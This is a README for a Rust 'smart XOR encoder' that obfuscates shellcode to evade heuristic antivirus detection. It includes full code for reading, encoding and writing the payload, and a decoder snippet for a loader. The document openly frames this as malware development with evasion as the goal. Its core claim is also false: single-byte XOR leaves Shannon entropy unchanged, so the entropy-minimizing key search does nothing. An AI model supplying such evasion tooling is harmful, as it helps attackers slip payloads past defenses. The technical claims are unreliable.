# Smart XOR Encoder

## Overview
`smart_xor_encoder` is a **malware development-style XOR shellcode encoder** that selects an optimal XOR key to minimize entropy, making the encoded shellcode less detectable by heuristic-based security mechanisms.

## Features
- **Random XOR key selection** with entropy evaluation.
- **Minimizes high-entropy output** to evade detection.
- **Reads raw shellcode from a file** and outputs an encoded version.
- **Provides the XOR key** for decoding.

## Prerequisites
- **Rust toolchain** installed
- **Cargo package manager**

## Installation
Clone the repository:
```sh
git clone https://github.com/yourusername/smart_xor_encoder.git
cd smart_xor_encoder
```

Build the project:
```sh
cargo build --release
```

## Usage
Run the encoder on a raw shellcode file:
```sh
cargo run --release -- <input_shellcode.bin>
```

Example:
```sh
cargo run --release -- shellcode.bin
```

This will generate an encoded shellcode file named **`encoded_shellcode.bin`** and output the **XOR key** used.

## Code Breakdown
### **1. Reading and Writing Shellcode**
```rust
fn read_shellcode(file_path: &str) -> Vec<u8> {
    let mut file = File::open(file_path).expect("Failed to open shellcode file");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).expect("Failed to read shellcode");
    buffer
}
```
- Reads raw shellcode into a `Vec<u8>`.

```rust
fn write_encoded_shellcode(file_path: &str, data: &[u8]) {
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(file_path)
        .expect("Failed to create encoded shellcode file");

    file.write_all(data).expect("Failed to write encoded shellcode");
}
```
- Writes the encoded shellcode to a file.

### **2. Smart XOR Encoding**
```rust
fn smart_xor_encode(shellcode: &[u8]) -> (Vec<u8>, u8) {
    let mut rng = rand::thread_rng();
    let mut best_key = 0;
    let mut best_encoded = Vec::new();
    let mut min_entropy = f64::MAX;

    for _ in 0..256 {
        let key = rng.gen_range(1..=255);
        let encoded: Vec<u8> = shellcode.iter().map(|&b| b ^ key).collect();
        let entropy = calculate_entropy(&encoded);

        if entropy < min_entropy {
            min_entropy = entropy;
            best_key = key;
            best_encoded = encoded;
        }
    }

    (best_encoded, best_key)
}
```
- Iterates over **256 possible XOR keys**, choosing the one that results in **the lowest entropy**.
- Reduces randomness to **avoid heuristic detection**.

### **3. Calculating Entropy**
```rust
fn calculate_entropy(data: &[u8]) -> f64 {
    let mut freq = [0u32; 256];

    for &byte in data {
        freq[byte as usize] += 1;
    }

    let total = data.len() as f64;
    freq.iter()
        .filter(|&&f| f > 0)
        .map(|&f| {
            let p = f as f64 / total;
            -p * p.log2()
        })
        .sum()
}
```
- Calculates **Shannon entropy** of the encoded shellcode.
- Used to determine **how random** the output appears.

### **4. Running the Encoder**
```rust
fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("❌ Usage: {} <input_shellcode.bin>", args[0]);
        return;
    }

    let input_file = &args[1];
    let output_file = "encoded_shellcode.bin";

    let shellcode = read_shellcode(input_file);
    let (encoded_shellcode, xor_key) = smart_xor_encode(&shellcode);
    write_encoded_shellcode(output_file, &encoded_shellcode);

    println!(
        "✅ Smart XOR Encoding Complete!\n🔑 XOR Key: {}\n📁 Saved as: {}",
        xor_key, output_file
    );
}
```
- Reads shellcode, encodes it using **smart XOR**, and saves the result.
- Prints the **XOR key** needed for decryption.

## Decoding the Shellcode
The decoder is a simple XOR operation using the **key displayed after encoding**:
```rust
fn xor_decode(buf: &[u8], key: u8) -> Vec<u8> {
    buf.iter().map(|x| x ^ key).collect()
}
```

To decrypt the encoded shellcode in your loader:
```rust
let decoded_shellcode = xor_decode(&encoded_shellcode, xor_key);
```

## Disclaimer
This project is for **educational and research purposes only**. Unauthorized use of this tool is strictly prohibited.

## License
[MIT License](LICENSE)

